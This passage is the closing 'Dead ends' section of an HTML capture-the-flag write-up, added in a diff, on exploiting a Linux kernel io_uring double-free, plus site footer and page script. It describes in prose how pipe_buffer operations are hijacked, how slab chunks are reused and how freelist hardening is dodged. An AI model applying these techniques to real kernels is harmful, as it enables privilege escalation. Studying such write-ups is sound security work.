+</svg><p class="meme-cap bot">AFTER ONLY SIX HOURS OF THE WRONG ROOT CAUSE</p></div></figure></section><section id="dead-ends"><h2><span class="hn">05</span>Dead ends</h2><ul class="bullets"><li>Wrong root cause, insisted on for hours. The working hypothesis was a "ring-head off-by-64", that the crafted entries at index 0/1 were never being consumed because bl-&gt;head had advanced. Five independent analysis agents refuted it unanimously, one decisively with a buffer-ID oracle: stamping bid = <code>0x300</code> on the crafted entry and observing the CQE come back bid = 768, res = 1024, proving the crafted entries were consumed. The actual mechanism is that IORING_RECVSEND_BUNDLE send is multishot (goto retry_bundle), so one SQE runs several peeks, head goes 0→64 (allocating) then 64→128 (filling, buggy kfree), ending at 128, and 128 &amp; 127 == 0. The original geometry had been correct all along; the "fix" broke working code.</li><li>A "settled" size-class finding that was wrong. A slabinfo measurement appeared to show the 1024-byte iovec array landing in kmalloc-part-NN-2k while pipe-&gt;bufs landed in kmalloc-part-NN-1k, "different size classes, they can never collide". That drove a change to NR=32, which produced 0/96. The measurement was a misattribution; the 64-entry (1024 B) array is the geometry that works, and the size "fix" was solving a non-problem.</li><li>Real reclaims dismissed as noise. An earlier build's 3/128 successful reclaims were written off as false positives. They were genuine hits.</li><li>~200 "failed attempts" that never ran. A batch runner used $D expecting shell state to persist between tool calls (it does not), and all boots shared one flag.raw write lock. Those runs never launched QEMU at all, nothing had regressed.</li><li>Naive double-free → instant panic. Simply closing the pipe after the corrupting write frees the chunk a second time and trips SLAB_FREELIST_HARDENED. Solved by re-owning the chunk from the same io_uring/kbuf.c call site (guaranteed same partition by _CODE_LOCATION_) before <code>close()</code>.</li></ul>
+<ul class="bullets"><li>RIP = <code>0x4141414141414141</code>. An early variant sprayed the whole write window with the ubuf fill pattern instead of placing the fake ops pointer at exactly +16; the ops slot got 'AAAAAAAA'. Fixed by mapping the fake pipe_buf_operations at a low fixed address (<code>0x11000000</code>) so it also fits the u32 that becomes iov_len, and by using the iovec[1].iov_base ↔ pipe_buffer[0].ops alignment deliberately.</li></ul>
+<ul class="bullets"><li><code>access_ok()</code> EFAULT path. A probe using an invalid iov_base returned -14; note the fill loop stores iov-&gt;iov_base before the check, so the write still lands while the error path skips the second kfree, a strictly better primitive in some variants, but the final exploit keeps all pointers valid.</li><li>Self-inflicted remote regression. After the first flag, the prompt-wait in <code>remote_drive.py</code> was cut from 45 s to 22 s to "fail boot flakes faster". All 21 subsequent attempts reported no shell, the remote simply needs longer than 22 s to reach a prompt. That instance (:23642) was torn down before</li></ul>
+<p>the timeout was restored to 55 s, losing that flag permanently. Immediately after the restore, attempt 4 on the next instance reached a shell. • Payload size. A -static glibc build (690 KB → 406 KB base64) is unusable when the binary must be re-pasted over a serial console on every 1/16 retry. Rewriting against raw syscalls with -nostdlib -Os cut it to 9 KB (3176 B base64, 7 echo lines). • Environmental noise to filter out: MP-BIOS 8254 timer not connected boot panics under CPU contention (local 16-way parallel QEMU, and a loaded remote host), broken qemu-bundle BIOS symlinks requiring -L.../qemu/pc-bios, and a full <code>/tmp</code> tmpfs after unpacking two kernel trees.</p></section>
+          <nav class="pager" aria-label="Challenge navigation"><a href="/blog/blackhat-mea-2026-quals/teto/"><span class="dir">← Previous</span><span class="t">Teto</span></a><a class="nx" href="/blog/blackhat-mea-2026-quals/extended-license/"><span class="dir">Next →</span><span class="t">extended-license</span></a></nav>
+        </article>
+        <aside class="wu-rail">
+          <h2>On this page</h2>
+          <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug">The bug</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#results">Results</a></li><li><a href="#dead-ends">Dead ends</a></li></ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-foot">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="wordmark" href="/">Usama Arshad<span class="dot">.</span></a>
+        <p>Offensive Security Lead. Red team, AppSec, and cloud security for fintech at scale. Based in Riyadh, Saudi Arabia.</p>
+      </div>
+      <nav class="foot-col" aria-label="Site index">
+        <h2>Index</h2>
+        <ul>
+          <li><a href="/">Portfolio</a></li>
+          <li><a href="/blog/">Writing</a></li>
+          <li><a href="/research/">Research</a></li>
+          <li><a href="/dorks/">Dork library</a></li>
+          <li><a href="/#contact">Contact</a></li>
+        </ul>
+      </nav>
+      <div class="foot-col">
+        <h2>Elsewhere</h2>
+        <ul>
+          <li><a href="https://github.com/usama0x01" target="_blank" rel="noopener">GitHub</a></li>
+          <li><a href="https://wpscan.com/leaderboard/" target="_blank" rel="noopener">WPScan leaderboard</a></li>
+          <li><a href="https://medium.com/@usama0x01" target="_blank" rel="noopener">Medium</a></li>
+          <li><a href="mailto:gusama21@gmail.com">gusama21@gmail.com</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-base">
+      <span>© 2026 Usama Arshad · Riyadh, Saudi Arabia</span>
+      <span class="colophon">Set in Fraunces, Inter &amp; JetBrains Mono, self-hosted · No trackers, no cookies</span>
+      <a href="#top">Back to top ↑</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+  var reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var head = document.querySelector(".site-head");
+  function onScroll(){ head.classList.toggle("scrolled", window.scrollY > 8); }
+  window.addEventListener("scroll", onScroll, { passive:true }); onScroll();
+
+  var prog = document.getElementById("prog");
+  if (prog) {
+    var tick = function () {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      prog.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + "%";
+    };
+    window.addEventListener("scroll", tick, { passive:true });
+    window.addEventListener("resize", tick); tick();
+  }
+
+  var revealEls = Array.prototype.slice.call(document.querySelectorAll("[data-reveal]"));
+  if (reduceMotion || !("IntersectionObserver" in window)) {
+    revealEls.forEach(function (el) { el.classList.add("in"); });
+  } else {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
+    }, { threshold:0.08, rootMargin:"0px 0px -5% 0px" });
+    revealEls.forEach(function (el) { io.observe(el); });
+    var geo = function () {
+      revealEls.forEach(function (el) {
+        if (!el.classList.contains("in") && el.getBoundingClientRect().top < window.innerHeight*0.95) el.classList.add("in");
+      });
+    };
+    window.addEventListener("scroll", geo, { passive:true });
+    window.addEventListener("resize", geo); geo();
+  }
+
+  document.querySelectorAll(".code-copy").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var pre = btn.closest(".code").querySelector("code");
+      var text = pre ? pre.textContent : "";
+      var done = function () {
+        btn.textContent = "Copied"; btn.classList.add("done");
+        setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("done"); }, 1400);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, function(){});
+      else {
+        var ta=document.createElement("textarea"); ta.value=text; ta.style.position="absolute"; ta.style.left="-9999px";
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand("copy"); done(); } catch(e){}
+        document.body.removeChild(ta);
+      }
+    });
+  });
+
+  document.querySelectorAll(".flagbox .reveal-btn").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var box = btn.closest(".flagbox");
+      btn.textContent = box.classList.toggle("shown") ? "Hide" : "Reveal";
+    });
+  });
+
+  var rail = document.querySelector(".wu-rail");
+  if (rail && "IntersectionObserver" in window) {
+    var links = Array.prototype.slice.call(rail.querySelectorAll("a"));
+    var secs = links.map(function (a) { return document.querySelector(a.getAttribute("href")); }).filter(Boolean);
+    var spy = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (!e.isIntersecting) return;
+        links.forEach(function (a) { a.classList.toggle("on", a.getAttribute("href") === "#" + e.target.id); });
+      });
+    }, { rootMargin:"-20% 0px -70% 0px" });
+    secs.forEach(function (s) { spy.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
